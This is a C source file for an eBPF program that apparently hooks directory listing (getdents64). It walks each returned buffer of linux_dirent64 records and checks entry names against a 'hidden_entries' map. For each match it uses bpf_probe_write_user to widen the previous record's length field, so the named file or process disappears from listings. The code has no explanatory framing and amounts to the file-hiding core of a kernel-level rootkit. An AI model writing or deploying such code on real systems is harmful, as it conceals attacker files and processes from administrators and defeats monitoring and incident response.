#include <bpf/bpf_helpers.h>
#include "vmlinux.h"
#include "getdents.h"

static __always_inline int read_dirent_name(__u8 *dst, const char *raw_data) {
   return bpf_core_read_user_str(dst, MAX_NAME_LEN, raw_data);
}

static __always_inline int read_dirent_reclen(u16 *dst, const unsigned short *raw_data) {
   return bpf_core_read_user(dst, sizeof(*dst), raw_data);
}

static __always_inline struct linux_dirent64 *get_dirent_ptr(u64 dirents_buf, int bpos) {
   return (struct linux_dirent64 *)(dirents_buf + bpos);
}

static __always_inline bool is_end_of_buffer(int bpos, long buf_size) {
   return bpos >= buf_size;
}

static __always_inline bool remove_dirent(dirent_scan_t *scan) {
   struct linux_dirent64 *prev = get_dirent_ptr(*scan->dirents_buf, (scan->bpos - scan->reclen_prev));
   u16 new_reclen = scan->reclen + scan->reclen_prev;
   return bpf_probe_write_user(&prev->d_reclen, &new_reclen, sizeof(new_reclen)) == 0;
}

static __always_inline u64 *lookup_dirent_buf(const u64 *pid) {
   return (u64 *)bpf_map_lookup_elem(&dirent_buf_map, pid);
}

static __always_inline int match_hidden_entry(u32 i, void *data) {
   match_ctx_t *ctx = data;
   const hidden_entry_t *entry = bpf_map_lookup_elem(&hidden_entries, &i);
   if (!entry || entry->name_len == 0)
      return 0;
   int max_len = entry->name_len < MAX_NAME_LEN ? entry->name_len : MAX_NAME_LEN;
   int j;
   for (j = 0; j < max_len; j++) {
      if (ctx->name[j] != entry->name[j])
         return 0;
   }
   if (j == entry->name_len && j < MAX_NAME_LEN && ctx->name[j] == 0x00) {
      ctx->found = true;
      return 1;
   }
   return 0;
}

static __always_inline int hide_dirent_if_match(u32 _, dirent_scan_t *scan)
{
   if (is_end_of_buffer(scan->bpos, scan->buf_size))
      return 1;

   __u8 name[MAX_NAME_LEN];
   struct linux_dirent64 *dirent = get_dirent_ptr(*scan->dirents_buf, scan->bpos);

   read_dirent_reclen(&scan->reclen, &dirent->d_reclen);
   read_dirent_name(name, dirent->d_name);

   match_ctx_t ctx = {
      .name = name,
      .found = false,
   };
   bpf_loop(MAX_HIDDEN, match_hidden_entry, &ctx, 0);
   if (ctx.found) {
      scan->patch_succeeded = remove_dirent(scan);
   }
   scan->reclen_prev = scan->reclen;
   scan->bpos += scan->reclen;
   return 0;
}